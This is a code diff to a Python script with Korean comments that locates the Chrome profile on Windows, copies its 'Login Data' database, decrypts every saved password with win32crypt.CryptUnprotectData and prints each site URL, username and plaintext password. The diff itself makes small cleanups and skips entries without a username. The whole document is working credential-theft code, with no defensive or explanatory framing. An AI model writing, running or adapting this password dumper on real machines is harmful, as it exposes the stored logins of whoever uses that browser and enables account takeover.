@@ -18,15 +18,17 @@ for i in reversed(range(1,2)):
     print(chr(27) + "[2J")
 
 
-home = home = expanduser("~")
+home = expanduser("~")
 path = home+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 
 print("Home Path= "+home)
 print("Data Path= "+path) 
 
 os.chdir(path)
-print("Current Path= ",os.getcwd())
+print("Current Path= ", os.getcwd())
 sleep(1)
+print()
+print()
 
 shutil.copy('Login Data','LoginDataForCrack.db')
 
@@ -37,14 +39,17 @@ cursor.execute("SELECT id,origin_url,username_value,password_value FROM logins")
 rows = cursor.fetchall()
 datalist=list(rows)
 dec_pw_list = []
-i=0
 
 
 for data in datalist:
     index = datalist.index(data)
     dec_password = win32crypt.CryptUnprotectData(data[3], None, None, None, 0)[1]  # 크롬 비밀번호 보관(암호화) 방식: win32crpyt
     dec_password = dec_password.decode('utf-8')
-    datalist[index] = (data[0], "URL: "+ data[1], "ID: "+ data[2], "PASSWORD: "+dec_password)
+    if(data[2]):
+        datalist[index] = (data[0], "URL: "+ data[1], "ID: "+ data[2], "PASSWORD: "+dec_password)
+    else:
+        datalist[index] = ('','','','')
 
 for row in datalist:
-    print(row)
+    if(row[2]): # ID 저장이 존재하면
+        print(row)
